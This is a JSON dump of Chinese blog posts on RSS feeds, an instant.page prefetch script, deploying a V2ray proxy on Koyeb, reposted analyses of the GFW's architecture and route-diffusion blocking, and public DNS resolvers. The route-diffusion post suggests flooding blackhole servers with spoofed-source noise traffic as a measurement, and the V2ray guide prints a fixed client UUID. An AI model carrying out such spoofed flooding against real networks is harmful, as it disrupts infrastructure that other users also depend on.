{"posts":[{"title":"Web Feed 倡议书","content":"独立博客应该提供 RSS/Atom 输出，以便读者可以订阅博客。 原文作者：涛叔 为了推动开放 Web 生态的发展，请使用 Web Feed，用户可以在浏览器中方便地订阅独立博客，从而获取类似微信公众号的体验。但目前基于 Web Feed (RSS/Atom) 的订阅方案还有不少问题。今天向广大作者发出倡议，希望能一起解决这些问题。 方便读者快速订阅博客 我们虽然可以在博客上指明 Feed 链接，但不同博客的链接位置却不尽相同，多数在页面的右上角，少数在页面底部，还有一些在左边或者右边。有的网站虽然提供 Feed 链接，却只在首页等特殊页面展示。如果用户只是阅读某篇特定的文章，则不能第一时间发现 Feed 链接。 为了解决这个问题，我建议所有作者都为博客加入 rss-autodiscovery 支持。简单来说就是在每个页面的 &lt;head&gt; 部分都添加特殊的 &lt;link&gt; 标签： &lt;link rel=&quot;alternate&quot; type=&quot;application/atom+xml&quot; title=&quot;RSS&quot; href=&quot;https://example.com/atom.xml&quot;&gt; 这里的 type 属性指明 Feed 类型。如果是 RSS 需要写成 application/rss+xml ，Atom 则需要写成 application/atom+xml。 有了这样标准化的 &lt;link&gt; 标签，我们才有可能实现自动发现、一键订阅等功能。 选择合适的 Feed 类型 我们知道 Feed 类型分为 RSS 和 Atom，虽然 RSS 历史更久远，兼容性更好，我还是建议大家选用 Atom 格式。这是因为在 RSS 规范里面，每一个 &lt;item&gt; 只有一个&lt;description&gt;字段。有的站长用它输出摘要，有的站长用它输出全文。局面比较混乱。而 Atom 规范则分别定义了 &lt;summary&gt; 和 &lt;content&gt;，在语义上更加清晰，客户端在解析的时候也更加简单。 Feed 文件体积过大 很多作者为了方便读者订阅，不但在 Feed 中输出了全文，而且还把所有的历史文章都加到了 Feed 中。这样会生成一个非常大的 XML 文件。Feed 文件体积过大，一方面会消耗不必要的服务器流量，导致下载时间过长，另一方面还会给客户端解析带来非常大的负担。更重要的是，我们不可能在短时间内写很多文章，所以用户订阅 Feed 的时候大多数情况下下载的 XML 文件内容都只有很少变化或者根本没有变化。 为此，我建议各位作者把 Feed 当成一种更新同步机制，而非内容同步机制。也就是说，大家只需要把最新发布的内容输出到 Feed 中就可以了。比如，我们可以只针对最新的十篇文章生成 Feed 文件。读者只需按照一定的周期来检查是否有新的 Feed 就不会错过新发布的文章。为了进一步减少 Feed 文件的体积，我进一步呼吁大家只在 Feed 中输出文章摘要。如果读者有兴趣，则可以作者的博客上继续阅读。 顺便提一个小细节。有的作者为了让读者回源站阅读全文，不但没有在 Feed 中输出全文，而且在输出的摘要的最后还附加了一个超链接，来引导读者跳转到自己的博客。其实这大可不必。因为 Feed 信息中已经包含了文章链接，阅读器一般也都会再显示一个阅读原文按钮。如果在文章摘要中再输出一个，那就会显示两个原文跳转链接，非常难看。 Feed 信息不完善 这个问题基本不影响用户订阅 Feed。但我还是建议作者能把网站标题、网站图标、主页链接、个人邮箱等信息加现 Feed 文件。 统一内容编码 建议大家统一使用 UTF-8 编码。 以上就是我所想到的 Feed 订阅问题。总结一下就是使用 Atom 格式，加入自动发现的 标签，只输出最新几篇文章的摘要，完善站点信息，比如一使用 UTF-8 编码。欢迎大家留言讨论。也欢迎大家关注Web Feed 项目。 ","link":"https://blog.gd1214b.icu/post/VpZwzuT9N/"},{"title":"使用instant.page js 脚本提升页面加载速度","content":"简介 instant.page 是一个 JS 库，当用户鼠标悬停在链接上面，就开始预加载网页，从而使得用户真正点击的时候，页面瞬间就能加载完成。 原理 instant.page 利用了 预加载技术，当用户有意向访问某个页面之前，浏览器首先对此页面进行预加载，当用户真正点击链接后，会从预加载的缓存中直接读取页面内容，缩短页面的加载时间。 当用户鼠标放在页面上某个链接上时，该脚本会在页面头部添加一行代码 &lt;link rel=&quot;prefetch&quot; href=&quot;链接地址&quot;&gt; 有了上面的link标记，浏览器就会提前加载这个网址。 注意由于仅仅是提前获取资源，因此浏览器不会对资源进行预处理，并且像 CSS 样式表、JavaScript 脚本这样的资源是不会自动执行并应用于当前文档的。 使用 &lt;script src=&quot;//instant.page/5.1.0&quot; type=&quot;module&quot; integrity=&quot;sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw&quot;&gt;&lt;/script&gt; 只需要复制这行代码添加到你的网站上即可。注意：将此HTML片段放在&lt;/body &gt;标签之前。 对于国内网站最好下载该脚本托管到自己网站上或国内cdn上，这样速度更快。 脚本可以去GitHub上下载，下载地址： https://raw.githubusercontent.com/instantpage/instant.page/master/instantpage.js 参考资料 https://instant.page/ https://www.muouseo.com/article/z64y9l6y5l.html ","link":"https://blog.gd1214b.icu/post/6L0RlpM8M/"},{"title":"Koyeb部署V2ray","content":"准备工作 GitHub账号 Docker Hub账号 Koyeb账号 部署步骤 打开仓库，并Fork一份；进入“Settings”，输入名称，改名： 编辑Actions文件docker-image.yml，按照“name: Docker Hub ID/自定义镜像名称”格式修改第13行： 添加Actions的Secrets变量，变量说明如下; DOCKER_USERNAME：Docker Hub 用户名 DOCKER_PASSWORD：Docker Hub 登录密码 登录Koyeb，创建一个APP，配置如下： Docker Image：Docker Hub镜像地址，格式为“docker.io/Docker Hub 用户名/自定义镜像名称” Container size：部署配置，一般默认即可 Port：80 Environment variables：Key：PORT，Value：80 Name：随便 大概等待1-3分钟，然后出现“Healthy”字样即为部署成功 客户端配置 地址：***-***.koyeb.app (***是Koyeb为你分配的名称，如下图中红圈所示) 端口：443 用户ID：24b4b1e1-7a89-45f6-858c-242cf53b5bdb 额外ID：0 加密方式：auto 别名：随便填 传输协议: ws 伪装类型：none 路径：24b4b1e1-7a89-45f6-858c-242cf53b5bdb-vmess 传输层安全: tls 跳过证书认证：false SNI：***-***.prod-glb.koyeb.app 注意事项 不要滥用本服务，否则可能被封号。 参考资料 https://owo.misaka.rest/koyeb-xray/ https://github.com/Misaka-blog/KOXray ","link":"https://blog.gd1214b.icu/post/h8xX2dhsl/"},{"title":"深入理解GFW：内部结构","content":" 本文转自：https://gfwrev.blogspot.com/2010/02/gfw.html 之前我们对GFW进行了大量的黑箱测试，尽管大多数实验数据都得到了良好的解释，但是还是有些数据或者体现出的规律性（不规律性）没有得到合理的解释。比如TCP连接的各项超时时间，比如Google的443端口被无状态阻断时，继发状态的持续跟源IP相关的问题。比如一般TCP连接的继发阻断时，窗口尺寸和TTL的连续变化特性。这些问题已经超出纯协议的范畴，需要对GFW的内部结构进行进一步了解才能明白其原因。所以在这一章介绍GFW的实现和内部结构。 总的来说，GFW是一个建立在高性能计算集群上规模庞大的分布式入侵检测系统。其分布式架构带来了很高的可伸缩性，对骨干网一点上庞大流量的处理问题被成功转换成购买超级计算机堆砌处理能力的问题。它目前有能力对中国大陆全部国际网络流量进行复杂和深度的检测，而且处理能力“还有很大潜力”。 线路接入 对于GFW在网络上的位置，有很模糊的认知：“在三个国际出口作旁路监听”。然而还希望对在出国之前最后一跳之前发生了什么有详细了解。 GFW希望对不同线路的链路异构性进行耦合，并研究了快速以太网、低速WAN、光纤、专用信号多种类型链路的耦合技术。而根据《国际通信出入口局管理办法》，几大ISP有自己的国际出入口局，最后在公用国际光缆处汇合，比如在海缆登陆站之前汇合。据已有的资料，安管中心（CNNISC）有独立的交换中心，而且有报道说各个ISP是分别接入其交换中心。这样几个材料就可以形成一致的解释：为了适应不同ISP不同的链路规格，GFW自己的交换中心需要对不同的链路进行整合，不同的ISP分别引出旁路接入GFW。而没有接入GFW的线路则被称为“防外线”[来源不可靠]，不受GFW影响。接入的线路类型应该主要是光纤线路，因此通常称此接入方式为分光。这就是“旁路分光”。另外实验发现，GFW的接入地点并不一定紧靠最后一跳，因此图中以虚线表示。需要注意GFW的响应流量重新接回网络的地点难以确认，这里只是假设是与接出的地点相同。 负载平衡 面对多条骨干监测线路接入产生的巨大不均匀流量，不能直接接到处理集群，而是要先进行汇聚然后再负载均衡分流成均匀的小流量，分别送给处理集群并行处理。首先需要将网络设备通信接口（Pos、ATM、E1等）转换成节点可用的主机通信接口（FE、GE等）。处理负载均衡的算法经过仔细考虑，希望实现：流量均匀分布、对于有连接协议保持连接约束、算法简单。连接约束是指：一对地址端口对之间的一个连接全部通信都要保证调度到同一个节点。 GFW关于负载平衡的文章中主要提出两种算法。一种是轮转调度，对于TCP，当SYN到达时，以最近分配的节点号取模再加1，并将连接存入hash表，当后继流量到达时就能查询hash表获得目标节点号。[03a]另一种是基于连接参数的散列，对于N个输出端口调度输出端口号是H(源地址, 目标地址, 源端口, 目标端口) mod N，这个H函数可以是xor。 而之前的某个实验中我们碰到一种特殊的模式，负载平衡在解释其现象中起到了重要作用，下面专门分出一节详细说明。 一个关于窗口值的实验 实验步骤：发送含有关键词的特制包通过GFW，并接收GFW返回的阻断响应包。因为触发阻断之后，同地址对和同目标端口的连接都会受到继发阻断，为了消除这种干扰，一般采取顺序改变目标端口的扫描式方法。通过前期一些实验，我们已经发现和确认某类（二型）阻断响应包中的TTL和id都跟窗口大小有线性关系，我们认为窗口是基本量（二型窗口为5042时id发生了溢出，只有在id根据窗口算出时才会发生此种情况）。 然而在顺序扫描中有一种特殊的模式无法用现有证据解释。进一步的实验步骤是：在源、目标地址不变的情况下，顺序扫描目标端口，记录返回的阻断响应包的窗口。数据如下图，横轴是时间（秒），纵轴是端口号，每个点代表一次阻断触发事件中观测者收到的阻断包的窗口值。 可以明显看出一种线性增加的趋势。图像取局部放大看： 可以看出，在同一时间有13根较连续的线。这样产生了几个问题：为什么有独立可区分的不同的线？这些线表示了什么？为什么有13根？为什么每根线是递增的？ 为什么有独立可区分的不同的线？现象具有明显的可以继续划分的子模式，而不是一个整体的随机量，并且每个子模式都有良好的连续增加的性质。因此可以推测产生此现象的内在机制不是一块铁板，而是多个独立的实体。进一步的实验事实是，如果顺序扫描端口每次增加13，那么只会产生一条较连续的线而排除其他的线。这直接证明了模13同余端口产生结果的不可分性、实体性，以及同余类间的独立性。 这些线表示了什么？我们猜想，这13根线就表征了背后有13个独立实体分别根据某个内在的状态产生阻断响应，窗口值就是其内在状态的直接表现。 为什么有13个？而不是1个2个？这个时候，负载平衡就是对此事实的一种解释良好的模型。如果GFW有13个节点在线，由于希望将流量平均分配到每个节点，那么根据前面论文所述，便采用模的方式，在源、目标地址不变时，根据目标端口模13分配流量，目标端口模13同余的包会进入同一个节点。实际上更早的时候的一次实验是发现有15根线，同理可以猜测有15个节点在线。 为什么每根线是递增的？实验中发现，每次阻断GFW会分别向连接双方发送窗口值依次增加的两组阻断包，这样对于每方来说，每次阻断就会使窗口值增加2。每根线会递增正是说明节点在不断产生阻断包增加窗口值，一部分是实验观察者的观测行为触发的，另一部分则是普通网络流量造成的。如果对数据做差分并扣除观测造成的影响，甚至还可以对每节点产生阻断的速率有所估计。 但是为什么要让窗口递增？这背后的动机难以找到很合理的解释，可能这个窗口值有计数器的作用，也可能是为了在ip.id上对不同节点产生的包进行区分。事实上，一型的窗口值就是几乎随机但ip.id固定，窗口递增并非是必须的。 然而进一步的实验发现，如果目标端口、源地址不变，而目标地址顺序变化，图像就显得比较紊乱，找不出规律。虽然如此，仍然在局部可以识别出同时存在13根线的情况，进一步证实“13个节点在线”的猜测。这个实验的意义在于，通过对现象的分解约化，分离出GFW内部的某种独立实体结构，对论文中主张的负载平衡算法有进一步的实践证实，对GFW的内部结构得到进一步的认识。 数据处理 当数据流通过当数据总线到达终端节点之后，需要将其从物理层提取出来供上层进一步分析，这个部分称为报文捕获。普通的做法，先网卡中断一次通知内核来取，然后控制DMA传到内核空间，然后用户用read()，让内核copy_to_user()将sk_buff的数据复制到用户空间，但是这样复制一次就带来了无谓开销。因此GFW设计环状队列缓存，以半轮询半中断机制减少频繁中断的系统调用开销，用mmap实现zero-copy，把数据直接从网卡DMA到用户空间。这样性能提高很多（耦合也提高很多）。 链路层数据到怀里了，接下来要将数据上交给TCP/IP栈。论文中多次提到libnids（这个库我们也是第一眼就瞟到了，后来发现对诊断没什么用），将其作为基准，（甚至可能符合国情地）以其为蓝本改进，开发出了一种多线程的TCP/IP（自动机）。后面又在考虑对其进一步做自动机分解优化。后来又再次提出一种两级连接状态记录表，一级轻量级环状hash表可以缓解大量无效连接和SYN Flood的情况，二级表才真正存储连接的信息。实验结果与此相符：发送SYN之后的超时时间要比发送第一个ACK之后的超时时间短得多。文献中还提到libnids的half_stream，从实际的情况上看，GFW的TCP栈的确具有鲜明的半连接特性，也就是说：一个方向的TCP栈只检测客户端到服务端的数据，或者反之。这样一个直接的后果就是，即使服务端根本不在线没响应，客户端照样可以假装三次握手然后触发一堆RST。往好的方向看，也许是因为多线程TCP栈还原全连接时不想处理数据共享控制的问题。总而言之，GFW有一种非常轻量级的TCP/IP栈，刚好能够处理大多数遵守RFC的连接。如果用户稍微精明一点就能穿过去，GFW要么坐视不管，要么重写TCP栈。 TCP/IP栈将数据分片重组，流重组之后交给应用层解析。应用层由很多插件模块组成，耦合松，部署易。其应用层插件包括“HTTP、TELNET、FTP、SMTP、POP3、FREENET、IMAP、FREEGATE、TRIBOY”。 有意思的是，这是首次官方确认GFW与Freegate、Freenet、Triboy的敌对关系。应用层的协议大家都很熟悉不用多解释，不过应用层问题比传输层更多了。好几个模块都有一些小毛病，比如某类HTTP模块只认得CRLF作为EOL，换作LF便呆了。再比如某类DNS模块，发的DNS干扰包，十有五六都校验和错误，查询AAAA也返回A，还不如关掉。多数模块都是得过且过，刚好可以工作，一点都不完善。这里列出的、发现的问题按照软件设计一般规律也只是冰山一角。由此推断，GFW的设计哲学是：better is worse。 不过在可以生产论文的话题上，GFW绝不含糊，就是模式匹配。应用层模块把应用层协议解析好了，然后就要看是不是哪里有关键词，字符串匹配。搞了一堆论文出来，改进AC算法和BM算法，就差汇编的干活了，得出某种基于有限状态自动机的多模式匹配算法，特别适合GFW这种预定义关键词的需求。总之复杂度是线性的，攻击匹配算法消耗CPU什么的就不要想了。 响应机制 如果匹配到一个关键词了，要积极响应阻断之。响应的手段其他地方已经说得太多，手懒，特此剽窃一段，欢迎举报学术不正之风： 响应机制的发展已经经历IP包过滤（静态IP包过滤、动态IP包过滤）、连接欺骗（传输层连接欺骗、应用层连接欺骗）两个阶段，并且形成了针对不同的应用多种方式共存的现状。 静态IP包过滤是IDS通过和被保护网络与外部网络之间的连通边的端点网络层设备（路由器、三层交换机等）进行联动，在其上设置访问控制列表（ACL）或静态路由表来实现对指定IP地址的过滤。由于需要过滤的IP地址数量很大，大多数的网络层设备上对ACL大小和性能的支持不能满足要求，因此，实际工作中大多采用静态路由的方式。使用该种方式，信息入侵检测系统只能通过专用客户端程序静态写入的方式进行访问控制，粒度大（IP地址级），响应时间慢，容量较小，但是可以静态写入路由设备的配置文件中，是非易失的。 动态IP包过滤是指入侵检测系统采用动态路由协议（BGP，OSPF等）和关键路由设备进行路由扩散，将需要过滤的IP地址扩散到路由设备中的路由表中，特点是响应时间快、容量大，但是只能动态地写入路由设备内存（RAM）中的路由表中，是易失的，同样粒度大。 连接欺骗指信息入侵检测系统在敏感连接传输过程中伪造连接结束信令（RST，FIN）发送给连接的源和目的地址，以中断该连接。特点是实时性强、粒度小（连接级），可以针对某一次敏感连接进行阻断。缺点是对分析系统工作状态依赖较强，需要向业务网上发送数据包，易受DoS攻击。 通过和连接级防火墙设备进行联动，可以针对连接五元组（传输协议类型、源地址、源端口、目的地址、目的端口）对数据流进行过滤。可以针对指定的任意五元以内的组合条件进行过滤，实时性强、粒度小。 后来又加上了DNS劫持/污染，不过这个手动设置的机制已经不能算一个入侵检测系统的响应了。 日志记录 GFW有日志。这意味着什么？这就意味着当你翻墙的时候，你的所作所为都记录在案。不光是你一个人，其他所有人都经常翻墙。但据统计87.53%的人（361之316）都是无意之中翻墙，从统计理论上看，记录在案的无效信息过多会造成信息难以利用。因此GFW后期一直在做“数据融合、聚类、分类的研究”，鸭子硬上弓，各种神经网络、概率模型、人工智能的论文整了一大堆，效果如何呢？ GFW的日志应该会记录这样一些事件信息：起始时间、结束时间、源地址、目标地址、目标端口、服务类型、敏感类型。信息难以利用不等于不能利用，如果日志被翻出来了而且用户没有用代理，那么根据常识，从IP地址对应到人也只是时间问题。这就是说，GFW即使不能阻断，最差也是一个巨型监听设备。 规模估计 问题：GFW的软硬件配置？ 事实： “虚拟计算环境实验床”是由国家计算机网络应急技术处理协调中心（CNCERT/CC）和哈尔滨工业大学（HIT）协作建设，以国家计算机网络应急技术处理协调中心遍布全国31个省份的网络基础设施及计算资源为基础，对分布自治资源进行集成和综合利用，构建起的一个开放、安全、动态、可控的大规模虚拟计算环境实验平台，研究并验证虚拟计算环境聚合与协同机理。2005年此平台配置如下： CNCERT/CC 北京 曙光4000L 128节点 2*Xeon 2.4G RAM2G HIT 哈尔滨 曙光服务器 32节点 2*Xeon 2.4G RAM2G CNCERT/CC 上海 Beowulf集群 64节点 2*AMD Athlon 1.5G RAM2G 结论： GFW（北京）使用曙光4000L机群，操作系统Red Hat系列（从7.2到7.3到AS 4），周边软件见曙光4000L一般配置；GFW实验室（哈工大）使用曙光服务器]，Red Hat系列；GFW（上海）使用Beowulf集群（攒的？）。 问题：GFW与曙光是什么关系？ 事实： 换句话说，是先有了用户的应用需求，才有了曙光4000L的研制。这其实不难想像，一套价值几千万元的系统，如果纯是为了填补科学空白，将会延长产品市场化的时间。曙光4000L充分体现了中科院计算所在科研成果市场化方面的运作能力，而曙光4000L这套系统就是针对国家信息化的实际应用而设计的。 在曙光4000L的研制中，曙光公司从事了工程任务和产品化工作，国防科技大学从事了机群数据库中间件的开发工作，哈尔滨工业大学开发了应用软件。 结论： GFW是曙光4000L的主要需求来源、研究发起者、客户、股东、共同开发者。是不是应该打一点折？（曙光公司=中科院计算所） 问题：GFW计算规模有多大？ 事实： 2007年机群规模进一步扩大，北京增至360节点，上海增至128节点，哈尔滨增至64节点，共计552节点。机群间星型千兆互联。[null]计划节点数上千。[null] 曙光4000L……系统节点数为322节点，可扩展到640节点。根据功能的不同，曙光4000L可以分为服务节点、计算节点和数据库节点三类。每个计算节点2个2.4GHZ的Intel Xeon CPU，内存2GB。 2005年国家计算机网络与信息安全管理中心（北京）就已经建立了一套384*16节点的集群用于网络内容过滤（005工程）和短信过滤（016工程）。[来源不可靠] 64个节点、128个处理器（主频为2.8GHz）的曙光4000L……包括系统软件、管理软件、输入输出设备和存储设备，采购金额近千万。 才有了曙光4000L的研制……一套价值几千万元的系统。 国家信息安全重大项目“国家信息安全管理系统”（005工程）经费4.9亿。 猜测： GFW（北京）拥有16套曙光4000L，每套384节点，其中24个服务和数据库节点，360个计算节点。每套价格约两千万到三千万，占005工程经费的主要部分。有3套（将）用于虚拟计算环境实验床，计千余节点。13套用于骨干网络过滤。总计6144节点，12288CPU，12288GB内存，峰值计算速度48万亿次（定义不明，GFW不做浮点运算，2003年top500排名榜首地球模拟器5120个CPU）。 问题：GFW吞吐量有多大？ 事实： 2GHz CPU的主机Linux操作系统下可达到600Kpps以上的捕包率。通过骨干网实验，配置16个数据流总线即可以线速处理八路OC48接口网络数据。曙光4000L单结点的接入能力为每秒65万数据包，整个系统能够满足32Gbp的实时数据流的并发接入要求。 猜测： 512Gbps（北京）。 ","link":"https://blog.gd1214b.icu/post/fUtaUQruW/"},{"title":"深入理解GFW：路由扩散技术","content":" 本文转自：https://gfwrev.blogspot.com/2009/11/gfw_05.html GFW的重要工作方式之一是在网络层的针对IP的封锁。事实上，GFW采用的是一种比传统的访问控制列表（Access Control List，ACL）高效得多的控制访问方式——路由扩散技术。分析这种新的技术之前先看看传统的技术，并介绍几个概念。 访问控制列表（ACL） ACL可以工作在网络的二层（链路层）或是三层（网络层），以工作在三层的ACL为例，基本原理如下：想在某个路由器上用ACL控制（比如说是切断）对某个IP地址的访问，那么只要把这个IP地址通过配置加入到ACL中，并且针对这个IP地址规定一个控制动作，比如说最简单的丢弃。当有报文经过这个路由器的时候，在转发报文之前首先对ACL进行匹配，若这个报文的目的IP地址存在于ACL中，那么根据之前ACL中针对该IP地址定义的控制动作进行操作，比如丢弃掉这个报文。这样通过ACL就可以切断对于这个IP的访问。ACL同样也可以针对报文的源地址进行控制。如果ACL工作在二层的话，那么ACL控制的对象就从三层的IP地址变成二层的MAC地址。从ACL的工作原理可以看出来，ACL是在正常报文转发的流程中插入了一个匹配ACL的操作，这肯定会影响到报文转发的效率，如果需要控制的IP地址比较多，则ACL列表会更长，匹配ACL的时间也更长，那么报文的转发效率会更低，这对于一些骨干路由器来讲是不可忍受的。 路由协议与路由重分发 而GFW的网络管控方法是利用了OSPF等路由协议的路由重分发（redistribution）功能，可以说是“歪用”了这个本来是正常的功能。 动态路由协议 说路由重分发之前先简单介绍下动态路由协议。正常情况下路由器上各种路由协议如OSPF、IS-IS、BGP等，各自计算并维护自己的路由表，所有的协议生成的路由条目最终汇总到一个路由管理模块。对于某一个目的IP地址，各种路由协议都可以计算出一条路由。但是具体报文转发的时候使用哪个协议计算出来的路由，则由路由管理模块根据一定的算法和原则进行选择，最终选择出来一条路由，作为实际使用的路由条目。 静态路由 相对于由动态路由协议计算出来的动态路由条目，还有一种路由不是由路由协议计算出来的，而是由管理员手工配置下去的，这就是所谓的静态路由。这种路由条目优先级最高，存在静态路由的情况下路由管理模块会优先选择静态路由，而不是路由协议计算出来的动态路由。 路由重分发 刚才说到正常情况下各个路由协议是只维护自己的路由。但是在某些情况下比如有两个AS（自治系统），AS内使用的都是OSPF协议，而AS之间的OSPF不能互通，那么两个AS之间的路由也就无法互通。为了让两个AS之间互通，那么要在两个AS之间运行一个域间路由协议BGP，通过配置，使得两个AS内由OSPF计算出来的路由，能通过BGP在两者之间重分发。BGP会把两个AS内部的路由互相通告给对方AS，两个AS就实现了路由互通。这种情况就是通过BGP协议重分发OSPF协议的路由条目。 另外一种情况，管理员在某个路由器上配置了一条静态路由，但是这条静态路由只能在这台路由器上起作用。如果也想让它在其他的路由器上起作用，最笨的办法是在每个路由器上都手动配置一条静态路由，这很麻烦。更好的方式是让OSPF或是IS-IS等动态路由协议来重分发这条静态路由，这样通过动态路由协议就把这条静态路由重分发到了其他路由器上，省去了逐个路由器手工配置的麻烦。 GFW路由扩散技术的工作原理 前面说了是“歪用”，正常的情况下静态路由是由管理员根据网络拓扑或是基于其他目的而给出的一条路由，这条路由最起码要是正确的，可以引导路由器把报文转发到正确的目的地。而GFW的路由扩散技术中使用的静态路由其实是一条错误的路由，而且是有意配置错误的。其目的就是为了把本来是发往某个IP地址的报文统统引导到一个“黑洞服务器”上，而不是把它们转发到正确目的地。这个黑洞服务器上可以什么也不做，这样报文就被无声无息地丢掉了。更多地，可以在服务器上对这些报文进行分析和统计，获取更多的信息，甚至可以做一个虚假的回应。 评价 有了这种新的方法，以前配置在ACL里的每条IP地址就可以转换成一条故意配置错误的静态路由信息。这条静态路由信息会把相应的IP报文引导到黑洞服务器上，通过动态路由协议的路由重分发功能，这些错误的路由信息可以发布到整个网络。这样对于路由器来讲现在只是在根据这条路由条目做一个常规报文转发动作，无需再进行ACL匹配，与以前的老方法相比，大大提高了报文的转发效率。而路由器的这个常规转发动作，却是把报文转发到了黑洞路由器上，这样既提高了效率，又达到了控制报文之目的，手段更为高明。 这种技术在正常的网络运营当中是不会采用的，错误的路由信息会扰乱网络。正常的网络运营和管控体系的需求差别很大，管控体系需要屏蔽的IP地址会越来越多。正常的网络运营中的ACL条目一般是固定的，变动不大、数量少，不会对转发造成太大的影响。而这种技术直接频繁修改骨干路由表，一旦出现问题，将会造成骨干网络故障。 所以说GFW是歪用了路由扩散技术，正常情况下没有那个运营商会把一条错误的路由信息到处扩散，这完全是歪脑筋。或者相对于正常的网络运营来说，GFW对路由扩散技术的应用是一种小聪明的做法。正常的路由协议功能被滥用至此，而且非常之实用与高效，兲朝在这方面真是人才济济。 测量 GFW动态路由系统概括起来就是：人工配置(c)样本路由器(sr)的静态路由(r)，向各ISP的出入口路由器(or)扩散此路由(r)，将特定网络流量转到黑洞服务器(fs)进行记录。因此可以进行测量的项目有： 被封锁的IP列表：可以通过协作报告机制收集用户报告，也可通过扫描著名站点获得；（传言：GFW动态路由系统的容量是几十万条规则） 受到GFW影响的ISP出入口路由器：通过在广域多ISP内的节点协作traceroute可以测得； 从关键词生效到动态路由生效的延迟：通过建立蜜罐并提交给GFW然后观察其响应； 黑洞服务器的健壮性：用伪源噪音流量对黑洞服务器进行填充，观测其响应。 参考文献 刘刚, 云晓春, 方滨兴, 胡铭曾. &quot;一种基于路由扩散的大规模网络控管方法&quot;. 通信学报, 24(10): 159-164. 2003. 李蕾, 乔佩利, 陈训逊. &quot;一种IP访问控制技术的实现&quot;. 信息技术, (6). 2001. ","link":"https://blog.gd1214b.icu/post/1_lSbPqlr/"},{"title":"如何选择适合的公共 DNS？","content":" 本文转自:https://blog.skk.moe/post/which-public-dns-to-use/ DNS 是互联网的基石之一，之前我在博客的 DNS 标签下写了不少关于权威 DNS 的文章，这次写一篇关于递归 DNS（也就是公共 DNS）的文章，从公共 DNS 的必要性、利弊来讲一讲选择公共 DNS 需要关注的事情，以及列举一些当前主流的公共 DNS。 是否需要公共 DNS 在选择公共 DNS 之前，你需要考虑一个问题：你是否真的需要公共 DNS 么？ 无论我们是 PPPoE 拨号上网，还是 DHCP 连接光猫上网，互联网服务提供商（ISP）都会下发两个 DNS 给你。为了方便介绍，在下文中我称这两个 DNS 为 ISP DNS。 在 DNS 的解析过程中，用户向递归 DNS 发起请求，递归 DNS 向权威 DNS 请求解析结果，可以说递归 DNS 起到一种转发的作用。运营商的 ISP DNS 就是递归 DNS；同时一些个人或互联网服务提供商也会架设自己的递归 DNS 开放给所有人使用，称为公共 DNS。 对于绝大部分人来说，运营商下发的 ISP DNS 应该是最准确的和最合适的，响应时间短、CDN 解析结果也会最准确。 但是运营商不是做公益的。运营商经常使用 DNS 投毒来引导用户去使用他们的 缓存服务器，从而降低运营商带宽负载；或者劫持解析将用户引导去他们已经插入了广告的镜像站点，从而获利；或者为了国家相关法律政策要求或者运营商自己的需求屏蔽一些网站的访问（如辽宁联通曾将工信部举报站点的域名解析至 127.0.0.1）；或者自行篡改 TTL（DNS 结果缓存时间）降低 DNS 的负载，结果就是解析结果不能尽快更新；或者对于不正确的域名给你返回一个满是广告的页面，等等。即使运营商非常良心不使用 DNS 做坏事，也有可能因为设备没有及时扩容或者维护不善而导致不佳的体验。 如果你为了追求更安全、更准确的 DNS 解析结果而决定继续使用公共 DNS（比如和我一样 雾），你就可以继续阅读下去了。 选择公共 DNS 时应该考虑什么 公共 DNS 服务有很多，有大公司搭建的，有非盈利组织搭建的，还有个人搭建的，令人眼花缭乱。在选择的时候我们需要考虑很多方面才能选出适合我们需求的 DNS。通常在选择对于我们上网起非常重要作用的 DNS 时，我们需要考虑以下方面： SLA 服务在线率。DNS 是上网冲浪事时非常重要的一个环节，DNS 的可靠性直接影响到上网的体验；如果 DNS 宕机，那么很大一部分网站将无法访问 响应速度 在访问一个新的网站时，DNS 对这个网站的响应速度会直接影响到当前网站的直观加载速度 准确性 即使不考虑 DNS 污染和投毒，DNS 对网站访问的结果是否准确是非常重要的 EDNS 简单地说，EDNS（正确的简称应该是 ECS）有助于帮助你获取最准确的 CDN 解析结果 其它特性 一些个人搭建的 DNS 会提供一些去广告或者爱国上网的功能 DNS 出口 通常情况下，公共 DNS 的入口和出口不同。你可以通过 dig命令 查看你的 DNS 出口 IP： dig whoami.akamai.net DNS 出口对于 CDN 非常重要。公共 DNS 的本质上就是把你的查询请求转发给上游 DNS；在没有 EDNS 的情况下，CDN 的权威 DNS 会根据公共 DNS 使用的请求 IP（也就是 DNS 出口）来判定你的运营商、你所在的位置，从而返回距离你最近的节点 IP。 所以说，理论上 ISP 给你分配的 DNS 应该是最快的、也是 CDN 友好的。本文接下来提到的 CDN 优化、CDN 友好，也是指的 DNS 出口的 IP 能否让你访问到最快的 CDN 节点。 受篇幅限制，本文只介绍一些大型的、有名的公共 DNS，而一些类似服务不稳定的 1.1.9.9（由牙木运营）公共 DNS 和速度慢 还不遵守 RFC 规范 的 IBM Quad9 DNS、Level 3 DNS，或者最好不被公开的 USTC 抗污染 DNS，亦或是只有单线单点部署的 360 公共 DNS、Verisign DNS，还有实际上没什么卵用的“安全 DNS” 如诺顿 DNS 和 OneDNS，本文就不介绍了。 中国国内一些公共 DNS 服务 腾讯 DNSPod Anycast：上海、天津、广州、香港 DNS 出口：同上 ECS：不完整支持 TCP 查询：不支持 IPV4: 119.29.29.29, 119.28.28.28 IPV6: 2402:4e00:: DoH: https://doh.pub/dns-query DoT: dot.pub 这是 DNSPod 建立的公共 DNS，之后 DNSPod 被腾讯收购以后由腾讯云负责运营。腾讯 DNSPod 公共 DNS 配置了 Anycast，节点囊括了腾讯云所有可用区的节点（包括海外），所以速度还是不错的，并且除了支持 ECS 以外还有一些关于 DNS 出口选择优化的加成，所以 CDN 解析结果相对准确很多。但是 SLA 却并不优秀—— 曾经 经常遭遇 DDoS 攻击导致无法解析。除此以外，由于相对出名、使用人数较多，是运营商重点劫持的对象。 值得一提的是，DNSPod 的公共 DNS 是免费提供 HTTPDNS 的，Demo 可以看 :https://www.dnspod.cn/httpdns/demo 阿里云公共 DNS Anycast：成都、深圳、杭州 DNS 出口：同上 ECS：部分支持（DNS JSON API 支持 edns_client_subnet） TCP 查询：不支持 IPV4: 223.5.5.5 ,223.6.6.6 IPV6: 2400:3200::1, 2400:3200:baba::1 DoH: https://dns.alidns.com/dns-query DoT: dns.alidns.com 阿里建立的公共 DNS。和腾讯一样，阿里公共 DNS 也是搭建在自家的云服务——阿里云上。虽然也配置了 Anycast，不过不包括海外节点，国内也就浙江阿里云和深圳阿里云两个节点， 而且华北地区都是隧道穿透回深圳，响应速度略逊于 DNSPod 提供的公共 DNS；阿里公共 DNS 不支持 ECS ，有 DNS 出口的优化 